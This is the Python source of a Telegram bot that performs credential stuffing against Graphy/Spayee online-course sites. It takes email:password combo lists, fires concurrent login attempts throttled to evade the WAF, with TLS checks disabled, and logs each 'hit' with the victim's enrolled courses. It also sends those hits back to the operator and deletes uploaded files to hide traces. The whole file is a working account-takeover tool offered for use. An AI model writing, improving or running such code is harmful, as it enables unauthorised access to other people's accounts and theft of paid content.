import os
import re
import asyncio
import aiohttp
import traceback
from yarl import URL

# --- Heroku / Python 3.10+ Asyncio Event Loop Fix for Pyrogram ---
try:
    loop = asyncio.get_event_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
# -----------------------------------------------------------------

from pyrogram import Client, filters
from pyrogram.types import Message

# Native Ask System (Bypasses Pyromod Bug on Modern Python)
WAITING_MESSAGES = {}

async def hacker_ask(client, chat_id, text, timeout=60):
    await client.send_message(chat_id, text)
    future = asyncio.get_event_loop().create_future()
    WAITING_MESSAGES[chat_id] = future
    try:
         reply = await asyncio.wait_for(future, timeout)
         return reply
    finally:
         WAITING_MESSAGES.pop(chat_id, None)

# Env Variables (Loaded from Heroku/Railway or Local ENV)
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

app = Client(
    "GraphyCheckerBot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

CHECKER_RUNNING = {} # Global flag for stopping checks mid-way

async def check_graphy_account(base_url, email, password):
    login_url = f"https://{base_url}/s/authenticate"
    
    payload = {
        "email": email,
        "password": password,
        "age": "",
        "url": "/"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"https://{base_url}",
        "Referer": f"https://{base_url}/t/public/login?signup",
        "Upgrade-Insecure-Requests": "1"
    }

    # Pro-Tip: Creating a new session per combo completely stops cross-account pollution (No false negatives)
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as session:
        try:
            # Step 1: Hit Login Endpoint (allow_redirects=False for maximum speed)
            async with session.post(login_url, data=payload, headers=headers, allow_redirects=False) as resp:
                cookies = session.cookie_jar.filter_cookies(URL(login_url))
                location = resp.headers.get("Location", "")
                
                # Hacker Logic: If c_ujwt cookie drops, OR redirect bypasses the login portal -> IT'S A HIT!
                is_hit = False
                if 'c_ujwt' in cookies:
                    is_hit = True
                elif resp.status in [301, 302, 303] and "login" not in location.lower() and "error" not in location.lower():
                    is_hit = True

                if not is_hit:
                    return {"status": "bad"}

            # Step 2: Grab Courses ONLY if Hit happens
            courses = []
            courses_urls = [
                f"https://{base_url}/s/mycourses",
                f"https://{base_url}/t/u/activeCourses",
                f"https://{base_url}/s/store"
            ]
            
            for c_url in courses_urls:
                if courses:
                    break
                async with session.get(c_url, headers=headers, allow_redirects=True, timeout=12) as c_resp:
                    html = await c_resp.text()
                    
                    # Method 1: React State JSON Extract (Fastest & Accurate for Graphy)
                    state_match = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.*?});', html)
                    if state_match:
                        try:
                            # Search for title or courseName
                            c_names = re.findall(r'"title"\s*:\s*"([^"\\]+)"', state_match.group(1))
                            c_names2 = re.findall(r'"courseName"\s*:\s*"([^"\\]+)"', state_match.group(1))
                            courses.extend(c_names + c_names2)
                        except:
                            pass
                    
                    # Method 2: Raw HTML element regex for generic Spayee clones
                    if not courses:
                        matches = re.findall(r'class="[^"]*course-title[^"]*"[^>]*>\s*([^<]+)\s*<', html, re.IGNORECASE)
                        if matches:
                            courses.extend([m.strip() for m in matches if m.strip()])
                            
                    # Method 3: Newer Graphy UI specific tags
                    if not courses:
                        matches = re.findall(r'<h3[^>]*class="[^"]*"[^>]*>\s*([^<]+)\s*</h3>', html, re.IGNORECASE)
                        if matches:
                            courses.extend([m.strip() for m in matches if m.strip()])

            # Scrape garbage filters
            final_courses = [c for c in list(set(courses)) if len(c) > 3 and c.lower() not in ['logo', 'icon', 'graphy', 'my courses', 'home', 'explore', 'store', 'profile']]

            return {
                "status": "hit", 
                "email": email, 
                "password": password, 
                "courses": final_courses if final_courses else ["No Courses / Hidden (Parse Manually)"]
            }
                
        except Exception as e:
            print(f"[ERROR] {email} -> {base_url}: {e}")
            traceback.print_exc()
            return {"status": "error"}

@app.on_message(filters.command("start"))
async def start_cmd(client: Client, message: Message):
    await message.reply("🤖 **Welcome to Graphy Universal Checker Bot!**\n\nSend /graphy to begin the extraction module.\nDeveloped to dynamically bypass Graphy/Spayee protections.")

@app.on_message(~filters.command("graphy") & ~filters.command("start") & ~filters.command("stop_graphy"))
async def catch_replies(client: Client, message: Message):
    chat_id = message.chat.id
    if chat_id in WAITING_MESSAGES and not WAITING_MESSAGES[chat_id].done():
        WAITING_MESSAGES[chat_id].set_result(message)


@app.on_message(filters.command("graphy"))
async def graphy_cmd(client: Client, message: Message):
    chat_id = message.chat.id
    
    # ====== PHASE 1: Taking Base URL ======
    try:
        url_ask = await hacker_ask(client, chat_id, "🌐 **SEND GRAPHY BASE URL**\n\nExample: `learn.rodha.co.in`\n\n_Type /cancel to abort._", timeout=60)
        if url_ask.text.lower() == '/cancel':
            return await message.reply("❌ Cancelled by admin.")
        
        # Clean URL nicely hack style
        base_url = url_ask.text.strip().replace("https://", "").replace("http://", "").split("/")[0]
    except Exception:
         return await message.reply("⚠️ Request timed out.")

    # ====== PHASE 2: Input TXT or Text Parsing ======
    try:
        combo_ask = await hacker_ask(client, chat_id, "📂 **Send Combo File (.txt) or Paste Combos (email:pass)**\n\n_Type /cancel to abort._", timeout=60)
        if combo_ask.text and combo_ask.text.lower() == '/cancel':
            return await message.reply("❌ Cancelled by admin.")
            
        combos = []
        if combo_ask.document: # If file is sent
            file_path = await combo_ask.download()
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                combos = f.read().splitlines()
            os.remove(file_path) # Hacker rule: Clean traces instantly
        elif combo_ask.text: # If direct text is pasted
            combos = combo_ask.text.splitlines()

    except Exception:
         return await message.reply("⚠️ Request timed out or file read error.")

    # Combo extraction
    valid_combos = []
    for line in combos:
        if ":" in line:
            parts = line.split(":", 1)
            valid_combos.append((parts[0].strip(), parts[1].strip()))

    total = len(valid_combos)
    if total == 0:
        return await message.reply("❌ No valid combos detected. Ensure `email:password` format is maintained.")

    await message.reply(f"🚀 **Firing Universal Graphy Engine**\n🔗 Target: `{base_url}`\n📊 Queued Combos: `{total}`")
    
    CHECKER_RUNNING[chat_id] = True
    msg = await message.reply("Initiating attack vectors... 0%")
    
    hits = []
    bad = 0
    errors = 0
    checked = 0
    hit_file = f"Graphy_Hits_{base_url}.txt"
    
    # Threading bypass: Use Semaphore so Graphy's Cloudflare backend doesn't WAF block IP.
    sem = asyncio.Semaphore(15) 
    
    async def worker(email, password):
        nonlocal checked, bad, errors
        if not CHECKER_RUNNING.get(chat_id, False):
            return
            
        async with sem:
            res = await check_graphy_account(base_url, email, password)
            if res["status"] == "hit":
                hits.append(res)
                courses_str = " | ".join(res["courses"])
                
                hit_text = f"Email: {res['email']}\nPass: {res['password']}\nCourses: {courses_str}\nTarget: {base_url}\n{'-'*30}\n"
                with open(hit_file, "a", encoding="utf-8") as f:
                    f.write(hit_text)
                
                # Real-time alert to user
                await client.send_message(chat_id, f"✅ **GRAPHY HIT GENERATED**\n\n📧 **Email:** `{res['email']}`\n🔑 **Pass:** `{res['password']}`\n📚 **Courses:** `{courses_str}`\n🌐 **Target:** `{base_url}`")
                
            elif res["status"] == "bad":
                bad += 1
            else:
                errors += 1
                
            checked += 1

    tasks = [worker(e, p) for (e, p) in valid_combos]
    
    # Real-time dashboard to avoid bot lagging
    async def updater():
        while checked < total and CHECKER_RUNNING.get(chat_id, False):
            try:
                progress = f"⚡ **GRAPHY BRUTE-FORCE LIVE** ⚡\n\n🌐 **Target:** `{base_url}`\n✅ **Hits:** `{len(hits)}`\n❌ **Bads:** `{bad}`\n⚠️ **Errors:** `{errors}`\n📊 **Checked:** `{checked}/{total}`"
                await msg.edit_text(progress)
            except:
                pass
            await asyncio.sleep(5) # Delay 5s to avoid hitting Telegram's FloodWait Limits
            
    updater_task = asyncio.create_task(updater())
    await asyncio.gather(*tasks) # Execute all combo hits
    updater_task.cancel() # Stop the updater loop when done
    
    # End Report Generator
    final_text = f"🏁 **GRAPHY CAPTURE COMPLETED** 🏁\n\n🌐 **Target:** `{base_url}`\n✅ **Total Hits:** `{len(hits)}`\n❌ **Bads:** `{bad}`\n⚠️ **Errors:** `{errors}`\n📊 **Processed:** `{total}/{total}`"
    try:
        await msg.edit_text(final_text)
    except:
        await message.reply(final_text)
    
    if len(hits) > 0:
        await message.reply_document(hit_file, caption=f"📁 **Final Hits DB for {base_url}**")
    else:
        if os.path.exists(hit_file):
            os.remove(hit_file)

# Bonus logic: Stop infinite check if you want to abort
@app.on_message(filters.command("stop_graphy"))
async def stop_checker(client, message):
    chat_id = message.chat.id
    if CHECKER_RUNNING.get(chat_id):
        CHECKER_RUNNING[chat_id] = False
        await message.reply("🛑 Kill signal activated... Engine stopping.")
    else:
        await message.reply("❌ No active graphy threads found.")

if __name__ == "__main__":
    if not API_ID or not API_HASH or not BOT_TOKEN:
        print("ERROR: Missing API_ID, API_HASH, or BOT_TOKEN environments variables!")
    else:
        print("Starting Universal Graphy Bot...")
        app.run()
